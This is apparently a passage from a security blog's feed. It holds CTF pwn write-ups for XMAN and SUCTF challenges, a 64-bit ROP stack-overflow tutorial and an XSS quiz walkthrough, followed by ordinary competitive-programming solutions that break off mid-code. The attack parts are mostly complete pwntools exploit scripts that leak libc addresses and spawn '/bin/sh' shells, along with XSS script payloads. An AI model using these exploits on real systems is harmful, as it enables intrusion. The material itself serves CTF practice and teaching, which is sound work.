libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh\x00'))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_ret_addr)payload += p64(read_got)payload += p64(1)payload += p64(write_plt)payload += p64(vuln_addr)p.send(payload)read_addr = u64(p.recv(8))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9883: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/level3_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/libc-2.19.so&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] read address =&gt; 0x7f5c484726a0[+] system address =&gt; 0x7f5c483cd590[+] sh address =&gt; 0x7f5c485038c3[*] Switching to interactive mode$ lsflaglevel3_x64$ cat flagCTF&#123;b1aeaa97fdcc4122533290b73765e4fd&#125; level 4分析main()函数和前同。 vuln函数： 没给libc，自己利用栈溢出和DynELF来泄露system地址。完了后调用read函数往bss段写入sh字符串，最后完成调用。这个思路很老套了。不过自己写的时候踩了很多坑，列举如下： leak函数中，若每次leak完后跳转到vuln函数地址，则远程getshell不成功，尽管本地测试可以。 leak函数中，需要在leak后先pop3把栈上参数清空后再进行跳转到main函数中，否则本地或远程getshell都不成功。 在泄露完system地址后，若再调用一次start函数以恢复栈，则远程getshell不成功，尽管本地测试可以。 还有一些… 以上几点，在以前利用时没遇到过，这次想了很久也不知道为什么。。。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *# p = process("./level4")p = remote("pwn2.jarvisoj.com",9880)# p = remote("127.0.0.1",12345)elf = ELF("./level4")pop3addr = 0x08048509offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']main_addr = elf.symbols['main']start_addr = elf.symbols['_start']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) # p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.send(payload) data = p.recv(4) return datad = DynELF(leak, elf=ELF("./level4"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(len(sh))payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.send(payload)p.send(sh)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/4$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done[*] &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] leaking address =&gt; 0x80480000x8048000 \x7fELF[+] Loading from &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos;: 0xf77fb930[*] leaking address =&gt; 0x804a004..........[+] system address =&gt; 0xf769be80[*] Switching to interactive mode$$$ lsflaglevel4$ cat flagCTF&#123;882130cf51d65fb705440b218e94e98e&#125; :)文件已打包：http://pan.baidu.com/s/1eR2XzNk 密码：9y4l12345678910111213141516171819202122232425xman├── 0│ ├── exp.py│ └── level0├── 1│ ├── exp.py│ └── level1├── 2│ ├── exp.py│ └── level2├── 2x64│ ├── exp.py│ └── level2_x64├── 3│ ├── exp2.py│ ├── exp.py│ ├── level3│ └── libc-2.19.so├── 3x64│ ├── exp.py│ ├── level3_x64│ └── libc-2.19.so└── 4 ├── exp.py └── level4]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SUCTF-2016-pwn400-writeup]]></title>
      <url>%2F2017%2F06%2F28%2FSUCTF-2016-pwn400-writeup%2F</url>
      <content type="text"><![CDATA[SUCTF-2016-pwn400-writeupIDA看，程序流程简单，有明显栈溢出漏洞。 无libc，无canary等保护。基本的思路如下： 构造ROP链 泄露system地址 往bss段写入/bin/sh 调用system 最后的exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *p = process("./simple")elf = ELF("./simple")offset = 40pop_rdi_ret_addr = 0x00000000004006c3pop_rsi_pop_r15_ret = 0x00000000004006c1start_addr = elf.symbols['_start']write_plt = elf.plt['write']read_plt = elf.plt['read']main_addr = elf.symbols['main']bss_addr = elf.bss() + 0x18def leak(address): log.info("leak address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil('luck!\n') payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_ret) payload += p64(address) payload += p64(1) payload += p64(write_plt) payload += p64(main_addr) p.sendline(payload) address = p.recv(8) return addressd = DynELF(leak,elf = elf)system_addr = d.lookup('system','libc')log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))payload = 'a' * offsetpayload += p64(start_addr)p.sendline(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_ret)payload += p64(bss_addr)payload += p64(1)payload += p64(read_plt)payload += p64(main_addr)p.sendline(payload)payload = '/bin/sh\x00'p.send(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.sendline(payload)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ROP学习：64位栈溢出]]></title>
      <url>%2F2017%2F06%2F26%2FROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路。 环境准备c程序 test.c ：123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 编译：1gcc test.c -o pwn -O0 -fno-stack-protector 选项 -O0 表示不进行任何优化， -fno-stack-protector表示无canary保护。 基础知识C语言调用机制使用了栈数据结构，先进后出。同时栈是由高地址向低地址增长。 在64位环境下，函数的调用所需要的参数是优先通过寄存器来进行的。寄存器的顺序如下：rdi,rsi,rdx,rcx,r8,r9。当一个函数有大于6个整形参数，则超出的部分会通过栈来传递，这个情况少见。 64位环境下，还有几个特殊的指针（寄存器）：rip、rbp和rsp。其中rip是指令指针，cpu会把rip指向的内容当作指令执行。rbp指向当前栈帧的底部。rsp指向当前栈帧的顶部。 ROP由于64位下，是优先通过寄存器来传参，所以不能像在32位环境下直接去布置栈上的数据来exp。这时需要用到ROP技术(Retrun-oriented Programmming)，从可执行文件或者库中提取部分代码片段来进行恶意利用。 比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如pop rdi;ret的代码片段，从而在执行完pop rdi后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret） 常见的寻找ROP的工具有很多，这里使用ROPgadget。以前面的例子为例。1ROPgadget --binary &quot;pwn&quot; --only &quot;pop|ret&quot; 分析我们的测试程序是123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 有非常明显的栈溢出漏洞，read从标准输入流（0）读取0x100放到name里面，之后write从name中读取长度为0x100的字节输出到屏幕（1）。我们可以通过输入，从而去覆盖func（）的返回地址，从而劫持控制流。 为能找到溢出点，可以使用pattern.py来测试。12(venv) chybeta@ubuntu:~/pwn/test$ pattern 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 接着利用gdb，在运行（r）后输入上述生成的字符串，此时gdb发生段错误。因为是在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为ret指令，相当于pop rsp，所以只要看一下rsp的值，就知道跳转的地址，从而知道溢出点。1234567gdb-peda$ x/gx $rsp0x7fffffffdc98: 0x3164413064413963.......(venv) chybeta@ubuntu:~/pwn/test$ pattern 0x3164413064413963Pattern 0x3164413064413963 first occurrence at position 88 in pattern. 所以，溢出点是88个字节。 提供libc环境准备用ldd命令可以看到pwn程序运行时使用的libc.so。1234(venv) chybeta@ubuntu:~/pwn/test$ ldd pwn linux-vdso.so.1 =&gt; (0x00007ffeb7d64000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb139e93000) /lib64/ld-linux-x86-64.so.2 (0x00005602037ac000) 将/lib/x86_64-linux-gnu/libc.so.6拷贝到当前目录下。1cp /lib/x86_64-linux-gnu/libc.so.6 libc.so 思路 提供了libc.so，可以计算出read函数与system函数和sh字符串的偏移量。 利用write函数泄露出read函数的地址，从而计算system函数和sh字符串的真实地址。 调用system函数，并传入参数，即sh字符串。 exp:接下去根据exp进行一下详细的讲解。12345678910from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so") # 题目提供offset = 88 offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh))) offset偏移由pattern.py和gdb计算得出。read与system地址和sh地址由提供的libc，结合pwntools得到。 12pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 两个地址，由ROPgadget得到，用于参数的传递。 123456789payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1) payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload) 利用write函数泄露read函数地址。&#39;a&#39;*offset后到溢出点return跳到执行pop rdi，此时栈顶的数据为1，pop完后1被保存在寄存器rdi中，作为write的第一个参数。之后返回（ret）跳转到执行pop rsi，此时栈顶的数据为read函数的plt表地址，pop完后，其地址被保存在rsi中，作为write的第二个参数。接下去要执行pop r15，没有什么用，所以我们随便写一个p64（1）进去。再接下去就是ret（返回）跳转到func函数，以便进行下一次利用。为什么我们没有设置write的第三个参数呢？？？ 见下文。 12p.recv(0x100)read_addr = u64(p.recv(8)) 前面发送payload后，先执行了正常的write函数流程，注意源程序中的write的第三个参数是0x100，所以需要先p.recv(0x100)，之后由于func的返回地址被覆盖了，程序流程会进入我们设置好的rop中。在rop链中，我们修改了write的前两个参数，此时write的函数调用如下：write(1,read_plt_addr,0x100)。我们的目的是获得read函数的地址，在64位环境下为8个字节，所以只需要截取write输出的前8个字节，即read_addr = u64（p.recv(8)）。 12345system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))log.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr))) 获取了read函数地址后，就可以计算system（）函数和字符串sh的地址了 1234567payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.interactive() 第一次rop结束后，我们让它ret到func函数，接下来构造新的rop。同样利用&#39;a&#39;*offset先溢出到return，通过pop rdi，将sh字符串的地址保存到寄存器rdi中，作为system（）函数的参数。之后是ret，直接返回到system（）函数的地址，从而成功getshell（） 附上完整的exp：123456789101112131415161718192021222324252627282930313233343536373839from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so")offset = 88offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh)))pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1)payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)read_addr = u64(p.recv(8))log.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() 不提供libc若题目没有提供libc的话，需要利用pwntool中的DynELF来泄露地址。但有些地方需要注意，因为DynELF会一直循环地去泄露地址，所以栈可能会有不可控的情况。根据《借助DynELF实现无libc的漏洞利用小结》，可以在函数地址泄露完后，调用_start函数以恢复栈。但我这里测试时，如果在泄露完成后再恢复就没办法pwn成功，我就直接把对_start的调用放到了leak函数里，每泄露一次就恢复一次栈。 思路 利用DynELF泄露出system的地址， 利用read函数向可写数据段（比如.bss段）写入字符串“/bin/sh” 调用system，getshell。 exp下面也是根据exp具体讲解。 1234from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88 注意这里，我们已经没有用到libc.so了，手里有的只有pwn这个程序。 1234bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 bss_addr是我们准备写入字符串的bss段地址。start_addr用于恢复栈。pop_rdi_ret_addr，pop_rsi_pop_r15_addr由ROPgadget得到。 1234567891011121314151617181920def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return address 利用rop技术，结合write（）函数，泄露出地址后又回到func函数体中。注意泄露的地址是8个字节，所以address = p.recv(8)，而write的第三个参数（0x100）我们没法改变，所以需要用p.recv()接收剩下的字符。接下去就是回到func函数后，会去调用_start函数，恢复栈。完了后再次进入func（），进行下一次泄露。 123456d = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr))) 利用DynELF泄露出system和read函数的地址。read函数的地址，其实可以直接获得，即注释中的read_addr = elf.plt[&#39;read&#39;] 12345678910111213payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload) 这一部分，调用read函数，向bss段写入/bin/sh字符串，之后再回到func函数体中。通过pop_rdi_ret_addr构造了read的第一个参数是0，通过pop_rsi_pop_r15_addr构造了read的第二个参数为bss_addr。接下去的那个p64(1)只是为了执行pop_r15没有其他用处。因此在调用read（）时是这样的：read(0,bss_addr,0x100)。 12345678payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() 这一部分，调用system（），利用pop_rdi_ret_addr提供参数/bin/sh 附上完整exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return addressd = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload)payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss-quiz-writeup]]></title>
      <url>%2F2017%2F06%2F25%2Fxss-quiz-writeup%2F</url>
      <content type="text"><![CDATA[xss-quiz： http://xss-quiz.int21h.jp/ Stage 1payload:1&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 2http://xss-quiz.int21h.jp/stage2.php 尝试如下payload：1&lt;script&gt;alert(document.domain)&lt;/script&gt; 无反应，查看源代码： 需要闭合前面value的双引号，所以最后payload如下：1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot; Stage 3http://xss-quiz.int21h.jp/stage-3.php 多了一个选择country的功能。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ACM-OJ[长期更新]]]></title>
      <url>%2F2017%2F06%2F19%2FACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%2F</url>
      <content type="text"><![CDATA[最近更新日期：2017-08-11干脆把自己平日做的题放在一篇文章里吧。不然太分散了。POJ: 1163 1182 1258 1273 1979 2236 2388 3069 3176 3253 3617XOJ: 1004 1005 1022 1061 1062 1075 1078 1316 POJ1163题目http://poj.org/problem?id=1163 思路见下面POJ-3176题分析 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 1182题目http://poj.org/problem?id=1182 思路并查集使用。输入的x，有三种种类A,B,C，分别用x，x+n,x+2n来代表。输入后，先判断x，y是否符合范围要求。第一种关系中：x和y是同一种种类。即union_set(x,y),union_set(x+n,y+n),union_set(x+2n,y+2n)。在执行union_set()之前，要看是否存在矛盾关系，即判断same_set(x,y+n) || same_set(x,y+2n) || same_set(x+n,y) || same_set(x+n,y+2n) || same_set(x+2n,y) || same_set(x+2n,y+n)。第二种关系中；x吃y。即union_set(x,y+n),union_set(x+n,y+2n),union_set(x+3n,y).。在执行union_set()之前，要看是否存在矛盾关系，即判断same_set(x,y)|| same_set(x,y+2n) || same_set(x+n,y+n) ||same_set(x+n,y) || same_set(x+2n,y+n) || same_set(x+2n,y+2n)。 另外数组如果开小的话，会导致runtime error。。。 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#define MAX_N 500000using namespace std;int ans;int par[MAX_N];int ran[MAX_N];void init_set(int n)&#123; for (int i=1; i &lt;= n ; i++)&#123; par[i] = i; ran[i] = 0; &#125;&#125;int find_set(int x)&#123; int i = x; while(par[i] != i) &#123; i = par[i]; &#125; while(par[x] != i)&#123; int next; next = par[x]; par[x] = i; x = next; &#125; return i;&#125;int same_set(int x,int y)&#123; return find_set(x) == find_set(y);&#125;void union_set(int x,int y)&#123; int root_x = find_set(x); int root_y = find_set(y); if (root_x == root_y) return; if (par[root_x] &gt; par[root_y])&#123; par[root_y] = root_x; &#125;else&#123; par[root_x] = root_y; if (ran[root_x] == ran[root_y]) ran[root_y]++; &#125;&#125;int main()&#123; int n,k; ans = 0; scanf("%d%d",&amp;n,&amp;k); init_set(n*3); for (int i = 0; i &lt; k; i++)&#123; int d,x,y; scanf("%d%d%d",&amp;d,&amp;x,&amp;y); if (x &lt; 1 || x &gt; n || y &lt; 1 || y &gt; n)&#123; ans++; continue; &#125; if ( d == 1)&#123; if ( same_set(x,y+n) || same_set(x,y+2*n) || same_set(x+n,y) || same_set(x+n,y+2*n) || same_set(x+2*n,y) || same_set(x+2*n,y+n) )&#123; ans++; &#125;else&#123; union_set(x,y); union_set(x+n,y+n); union_set(x+2*n,y+2*n); &#125; &#125;else&#123; if (same_set(x,y)|| same_set(x,y+2*n) || same_set(x+n,y+n) ||same_set(x+n,y) || same_set(x+2*n,y+n) || same_set(x+2*n,y+2*n))&#123; ans++; &#125;else&#123; union_set(x,y+n); union_set(x+n,y+2*n); union_set(x+2*n,y); &#125; &#125; &#125; printf("%d\n",ans); return 0;&#125; 1258题目http://poj.org/problem?id=1258 思路最小生成树。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define MAX 105#define INF 0xFFFFFFusing namespace std;int n;int cost[MAX][MAX] ;int mincost[MAX];bool used[MAX];int prim() &#123; for ( int i = 0; i &lt; n; i++)&#123; mincost[i] = INF; used[i] = false; &#125; mincost[0] = 0; int res = 0; while ( true )&#123; int v = -1; for ( int u = 0; u &lt; n; u++)&#123; if ( !used[u] &amp;&amp; ( v == -1 || mincost[u] &lt; mincost[v])) v = u; &#125; if ( v == -1 ) break; used[v] = true; res += mincost[v]; for (int u = 0; u &lt; n; u++) mincost[u] = min(mincost[u], cost[v][u]); &#125; return res;&#125;int main()&#123; while(scanf("%d",&amp;n) != EOF )&#123; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n; j++) cost[i][j] = INF; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n ; j++) scanf("%d", &amp;cost[i][j]); printf("%d\n",prim()); &#125; return 0;&#125; 1273题目http://poj.org/problem?id=1273 思路模板题目，直接求最大流就可以。我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：12for (int i = 1; i &lt;= m; i++ ) G[i].clear(); 方法是网上找的，网上说这样清空了元素，但不会回收内存。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;memory.h&gt;#define MAX 205#define INF 0x7fffffffusing namespace std;struct edge &#123;int to ,cap, rev;&#125;;vector&lt;edge&gt; G[MAX];bool used[MAX];int n,m;void add_edge(int from, int to,int cap)&#123; edge one,two; one.to = to; one.cap = cap; one.rev = (int)(G[to].size()); G[from].push_back(one); two.to = from; two.cap = 0; two.rev = (int)(G[from].size()-1); G[to].push_back(two);&#125;int dfs(int v, int t, int f)&#123; if ( v == t) return f; used[v] = true; for ( int i = 0; i &lt; (int)G[v].size(); i++)&#123; edge &amp;e = G[v][i]; if ( !used[e.to] &amp;&amp; e.cap &gt; 0)&#123; int d = dfs(e.to,t, f &gt; e.cap?e.cap:f); if ( d &gt; 0) &#123; e.cap -= d; G[e.to][e.rev].cap += d; return d; &#125; &#125; &#125; return 0;&#125;int max_flow(int s, int t)&#123; int flow = 0; for (;;)&#123; memset(used, 0, sizeof(used)); int f = dfs(s,t,INF); if (f == 0) return flow; flow += f; &#125;&#125;int main()&#123; while (scanf("%d%d",&amp;n,&amp;m) != EOF)&#123; for (int i = 1; i &lt;= m; i++ ) G[i].clear(); for (int i = 0; i &lt; n; i++)&#123; int s, t,c; scanf("%d%d%d",&amp;s,&amp;t,&amp;c); add_edge(s,t,c); &#125; printf("%d\n",max_flow(1,m)); &#125; return 0;&#125; 1979题目http://poj.org/problem?id=1979 思路DFS() 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define X 20#define Y 20using namespace std;int x,y;int nx,ny;int sx,sy;int num;char maze[X][Y];int dx[4] = &#123;-1,0,1,0&#125;;int dy[4] = &#123;0,1,0,-1&#125;;void dfs(int r, int s)&#123; num += 1; maze[r][s] = '#'; for (int i = 0; i &lt; 4; i++)&#123; int t1 = r+dx[i]; int t2 = s+dy[i]; if (0 &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; 0 &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == '.')&#123; dfs(t1,t2); &#125; &#125;&#125;int main()&#123; scanf("%d%d",&amp;y,&amp;x); while( x != 0 &amp;&amp; y != 0)&#123; num = 0; for (int i = 0; i &lt; x; i++)&#123; for (int j = 0; j &lt; y; j++)&#123; scanf("\n%c",&amp;maze[i][j]); if (maze[i][j] == '@')&#123; sx = i; sy = j; &#125; &#125; &#125; dfs(sx,sy); printf("%d\n",num); scanf("%d%d",&amp;y,&amp;x); &#125; return 0;&#125; 2236题目http://poj.org/problem?id=2236 思路并查集。用结构体数组来作为节点，repair表示是否已经修理过，par表示其父节点。其余利用并查集即可。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#define MAX_N 1002using namespace std;struct node&#123; int repair; int par;&#125;computer[MAX_N];int ran[MAX_N];struct loc&#123; int x; int y;&#125;zuobiao[MAX_N];int n,d;int p,q;char op;void init_set(int n)&#123; for(int i=1; i &lt;= n; i++)&#123; computer[i].repair = 0; computer[i].par = i; ran[i] = 0; &#125;&#125;int find_root(int q)&#123; int i = q; while(computer[i].par != i)&#123; i = computer[i].par; &#125; while(computer[q].par != i)&#123; int temp = computer[q].par; computer[q].par = i; q = temp; &#125; return i;&#125;int same_set(int p,int q)&#123; return find_root(p) == find_root(q);&#125;void union_set(int p, int q)&#123; int p_root = find_root(p); int q_root = find_root(q); if (p_root == q_root) return; if(ran[p_root] &gt; ran[q_root])&#123; computer[q_root].par = p_root; &#125;else&#123; computer[p_root].par = q_root; if (ran[p_root] == ran[q_root])&#123; ran[q_root]++; &#125; &#125;&#125;int cal_distance(int p,int q)&#123; return (zuobiao[p].x-zuobiao[q].x)*(zuobiao[p].x-zuobiao[q].x)+(zuobiao[p].y-zuobiao[q].y)*(zuobiao[p].y-zuobiao[q].y);&#125;int maxdistance;int main()&#123; scanf("%d%d",&amp;n,&amp;d); maxdistance = d * d; for (int i = 1;i &lt;= n; i++)&#123; scanf("%d%d",&amp;zuobiao[i].x,&amp;zuobiao[i].y); &#125; init_set(n); while(scanf("\n%c",&amp;op) != EOF)&#123; if (op == 'O')&#123; scanf("%d",&amp;p); computer[p].repair = 1; for (int j = 1; j &lt;= n; j++)&#123; if (computer[j].repair == 1) if (cal_distance(p,j) &lt;= maxdistance)&#123; union_set(p,j); &#125; &#125; &#125;else&#123; scanf("%d%d",&amp;p,&amp;q); if (same_set(p,q))&#123; printf("SUCCESS\n"); &#125;else&#123; printf("FAIL\n"); &#125; &#125; &#125; return 0;&#125; 2387题目http://poj.org/problem?id=2387 思路最短路径 + 队列优先 。这题竟然是先读入边数再读入顶点数，Ｏrz另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#define MAX_V 200000#define INF 0xFFFFFFusing namespace std;struct edge &#123; int to, cost, flag ;&#125;;typedef pair&lt;int, int&gt; P;int 